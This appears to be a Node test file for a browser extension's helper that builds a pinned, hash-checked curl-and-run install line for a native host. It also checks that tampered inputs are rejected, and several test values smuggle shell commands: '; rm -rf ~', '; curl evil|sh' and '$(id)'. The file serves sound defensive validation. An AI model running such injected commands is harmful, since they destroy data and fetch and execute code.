// host-install.test.mjs — the line Settings shows to install the process host (src/shell/host-install.ts): built only from
// this install's id and the committed pin, for the platforms the release has a build for, never from anything else.

import { test } from "node:test";
import assert from "node:assert/strict";

const { hostInstall, EXTENSION_ID_RE } = await import("../src/shell/host-install.ts");
const ID = "abcdefghijklmnopabcdefghijklmnop";
const PIN = { tag: "v0.10.0", installer: { file: "install.sh", sha256: "ab".repeat(32) } };

// --- the line ---

test("macOS and Linux get the pinned installer, its hash checked before it runs, and the id", () => {
    const mac = hostInstall({ os: "mac", arch: "arm64" }, ID, PIN);
    assert.ok(mac.ok);
    assert.equal(mac.line, `f=$(mktemp) && curl -fsSL https://github.com/parawanderer/window-ml-host/releases/download/v0.10.0/install.sh -o "$f" && echo "${"ab".repeat(32)}  $f" | shasum -a 256 -c - && sh "$f" --extension-id ${ID}`);
    assert.equal(hostInstall({ os: "mac", arch: "x86-64" }, ID, PIN).line, mac.line, "Intel Macs: the same line");
    const linux = hostInstall({ os: "linux", arch: "x86-64" }, ID, PIN);
    assert.match(linux.line, /\| sha256sum -c - && sh/);
    assert.ok(hostInstall({ os: "linux", arch: "arm" }, ID, PIN).ok, "Chrome reports arm64 Linux as arm on some builds");
});

test("a platform with no build, a pin with no installer, and a malformed pin each show no line", () => {
    for (const p of [{ os: "win", arch: "x86-64" }, { os: "cros", arch: "arm64" }, { os: "linux", arch: "x86-32" }, { os: "mac", arch: "mips" }]) {
        const r = hostInstall(p, ID, PIN);
        assert.ok(!r.ok && /no window-ml-host build/.test(r.why), `${p.os} ${p.arch}`);
    }
    assert.match(hostInstall({ os: "mac", arch: "arm64" }, ID, { tag: "v0.9.0" }).why, /no installer/, "v0.9.0 has none");
    for (const bad of [{ tag: "v0.10.0; rm -rf ~", installer: PIN.installer }, { tag: "v0.10.0", installer: { file: "install.sh", sha256: "x".repeat(64) } }]) {
        assert.ok(!hostInstall({ os: "mac", arch: "arm64" }, ID, bad).ok, "a pin that is not a tag and a hash is refused before it reaches a shell");
    }
});

test("the committed pin yields a line or says why not, and never the id it was not given", () => {
    const r = hostInstall({ os: "mac", arch: "arm64" }, ID);
    if (r.ok) assert.ok(r.line.includes(ID) && !r.line.includes("undefined"));
    else assert.match(r.why, /installer/);
});

// --- the id is the extension's own, and only that ---

test("only a 32-letter a-p id reaches the line: anything else, a quote, a semicolon, a path, is refused", () => {
    for (const bad of ["", "abc", `${ID}; curl evil|sh`, `${ID}"`, "../".repeat(11), ID.toUpperCase(), `${ID}q`, ID.slice(1), "$(id)".padEnd(32, "a")]) {
        const r = hostInstall({ os: "mac", arch: "arm64" }, bad, PIN);
        assert.ok(!r.ok, `refused: ${JSON.stringify(bad)}`);
        assert.ok(!EXTENSION_ID_RE.test(bad));
    }
});
